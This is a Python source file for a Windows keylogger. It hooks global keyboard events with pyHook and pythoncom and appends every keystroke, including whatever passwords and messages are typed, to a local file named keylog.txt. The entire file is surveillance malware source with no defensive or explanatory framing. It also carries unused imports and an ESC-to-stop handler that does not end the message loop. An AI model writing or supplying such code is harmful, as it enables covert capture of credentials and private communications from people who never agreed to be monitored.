import os
import sys
import ctypes
import pyHook
import pythoncom
from threading import Thread

class KeyLogger:
    def __init__(self):
        self.filename = "keylog.txt"
        self.start_recording()

    def OnKeyboardEvent(self, event):
        if event.Ascii == 27:  # ESC key
            return False  # Stop recording
        elif event.Ascii == 32:  # SPACE key
            key = "[SPACE]"
        elif event.Ascii == 13:  # ENTER key
            key = "[ENTER]\n"
        else:
            key = chr(event.Ascii)
        self.write_to_file(key)
        return True  # Continue recording

    def write_to_file(self, data):
        with open(self.filename, "a") as file:
            try:
                file.write(data)
            except Exception as e:
                print(f"Error writing to file: {e}")

    def start_recording(self):
        hooks_manager = pyHook.HookManager()  # Create a hook manager
        hooks_manager.KeyDown = self.OnKeyboardEvent  # Define the callback function for key events
        hooks_manager.HookKeyboard()  # Set the hooks
        pythoncom.PumpMessages()  # Wait for ESC key to be pressed

if __name__ == "__main__":
    try:
        keylogger = KeyLogger()
    except Exception as e:
        print(f"Error occurred: {e}")